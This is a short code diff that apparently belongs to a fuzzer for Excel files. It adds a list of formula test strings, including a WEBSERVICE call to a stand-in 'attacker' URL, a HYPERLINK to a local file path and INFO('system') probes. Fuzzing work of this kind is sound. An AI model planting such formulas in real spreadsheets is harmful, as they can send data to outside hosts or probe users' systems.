@@ -196,6 +196,14 @@ _EXCEL_HYPERLINK_UIDS = (
     "{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}",
     "{12345678-1234-5678-1234-567812345678}",
 )
+_EXCEL_THEMEVAL_FORMULAS = (
+    "=THEMEVAL()",
+    '=THEMEVAL()+INDIRECT("A1")',
+    '=THEMEVAL()+HYPERLINK("file://C:/")',
+    '=THEMEVAL()+WEBSERVICE("http://attacker")',
+    '=THEMEVAL()+INFO("system")',
+    '=THEMEVAL()+CELL("address")',
+)
 _EXCEL_FORMULA_TYPES = ("normal", "shared", "array", "dataTable", "reference", "", "invalid")
 _EXCEL_FORMULA_TEXT_MUTATIONS = (
     "SUM(A1:A1048576)",
